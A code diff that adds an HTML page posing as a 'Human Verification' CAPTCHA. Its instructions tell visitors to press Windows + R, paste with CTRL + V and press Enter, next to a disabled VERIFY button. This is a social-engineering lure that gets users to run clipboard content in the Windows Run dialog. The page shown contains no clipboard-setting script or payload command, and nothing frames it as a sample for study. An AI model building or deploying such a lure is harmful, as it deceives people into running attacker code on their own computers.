@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Human Verification</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f1f1f1;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .container {
+            width: 350px;
+            padding: 20px;
+            background-color: white;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            border-radius: 8px;
+            text-align: center;
+        }
+
+        .header {
+            font-size: 18px;
+            font-weight: bold;
+            color: #202124;
+            margin-bottom: 20px;
+        }
+
+        .instructions {
+            font-size: 16px;
+            color: #202124;
+            margin: 15px 0;
+            line-height: 1.5;
+            text-align: left;
+        }
+
+        .instructions b {
+            font-weight: bold;
+        }
+
+        .disabled-button {
+            background-color: #d3d3d3;
+            color: #808080;
+            border: none;
+            border-radius: 4px;
+            padding: 10px 20px;
+            font-size: 16px;
+            margin-top: 20px;
+            cursor: not-allowed;
+        }
+
+        .disabled-button:hover {
+            background-color: #d3d3d3;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2 class="header">Hey! Are you human? Let's find out!</h2>
+        
+        <div class="instructions">
+            1. Press <b>Windows + R</b><br>
+            2. In the box, press the following buttons: <b>CTRL + V</b><br>
+            3. Press Enter!
+        </div>
+
+        <button class="disabled-button" disabled>VERIFY</button>
+    </div>
+</body>
+</html>
